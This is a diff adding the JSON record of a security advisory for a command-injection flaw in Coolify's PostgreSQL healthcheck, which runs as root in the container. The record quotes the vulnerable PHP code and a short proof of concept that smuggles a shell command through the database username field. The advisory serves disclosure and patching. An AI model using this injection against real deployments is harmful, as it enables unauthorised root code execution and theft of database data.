@@ -1,0 +1,50 @@
+{
+  "global": null,
+  "id": "GHSA-gvc4-f276-r88p",
+  "repo": {
+    "cve_id": "CVE-2026-42153",
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": 8.8,
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"
+      },
+      "cvss_v4": {
+        "score": null,
+        "vector_string": null
+      }
+    },
+    "cwe_ids": [
+      "CWE-78"
+    ],
+    "description": "### Summary\r\n\r\nThe PostgreSQL database healthcheck command in Coolify uses user-controlled input (`postgres_user` and `postgres_db`) without proper shell escaping. Since Docker healthchecks with `CMD-SHELL` execute via `/bin/sh -c`, an attacker can inject arbitrary commands that execute as root inside the PostgreSQL container.\r\n\r\n### Details\r\n\r\n**Vulnerable Code - `app/Actions/Database/StartPostgresql.php:113-117`:**\r\n```php\r\n'healthcheck' => [\r\n    'test' => [\r\n        'CMD-SHELL',\r\n        \"psql -U {$this->database->postgres_user} -d {$this->database->postgres_db} -c 'SELECT 1' || exit 1\",\r\n    ],\r\n    'interval' => '5s',\r\n    'timeout' => '5s',\r\n    'retries' => 10,\r\n],\r\n```\r\n\r\nThe `postgres_user` and `postgres_db` fields are interpolated directly into the shell command without escaping. Docker's `CMD-SHELL` passes this to `/bin/sh -c`, which interprets shell metacharacters like `;`, `|`, `$()`, and backticks.\r\n\r\n**Note:** Client-side validation exists but can be bypassed, or the validation may not cover all injection vectors.\r\n\r\n### PoC\r\n\r\n**Environment:**\r\n- Coolify: v4.0.0-beta.470\r\n- User: Member (low-privileged)\r\n\r\n**Step 1:** Login as Member user\r\n\r\n**Step 2:** Create PostgreSQL database\r\n\r\n**Step 3:** Set Username to:\r\n```\r\npostgres; id > /tmp/hc_rce.txt; echo\r\n```\r\n\r\n**Step 4:** Save and Start the database\r\n\r\n**Step 5:** Wait 30 seconds for healthcheck to run\r\n\r\n**Step 6:** Verify command execution inside container:\r\n```bash\r\ndocker exec  cat /tmp/hc_rce.txt\r\n```\r\n\r\n**Result:**\r\n```\r\nuid=0(root) gid=0(root) groups=0(root),0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)\r\n```\r\n\r\n**Root code execution confirmed inside container!**\r\n\r\n### Video PoC\r\n\r\nhttps://youtu.be/e0vzVSlaA58\r\n\r\n### Impact\r\n\r\nAn attacker with any authenticated account can:\r\n- Execute arbitrary commands as root inside PostgreSQL container\r\n- Access all database credentials (environment variables)\r\n- Read/modify/delete all database data\r\n- Use container network access to attack internal services\r\n- Potential container escape depending on Docker configuration\r\n\r\n",
+    "ghsa_id": "GHSA-gvc4-f276-r88p",
+    "html_url": "https://github.com/coollabsio/coolify/security/advisories/GHSA-gvc4-f276-r88p",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-gvc4-f276-r88p"
+      },
+      {
+        "type": "CVE",
+        "value": "CVE-2026-42153"
+      }
+    ],
+    "published_at": "2026-07-02T16:36:22Z",
+    "references": [],
+    "severity": "high",
+    "summary": "PostgreSQL Healthcheck Command Injection Allows Root Code Execution in Container",
+    "updated_at": "2026-07-02T16:36:22Z",
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "composer",
+          "name": "coollabsio/coolify"
+        },
+        "patched_versions": "4.0.0-beta.474",
+        "vulnerable_version_range": "<= 4.0.0-beta.473"
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "repository": "coollabsio/coolify"
+}
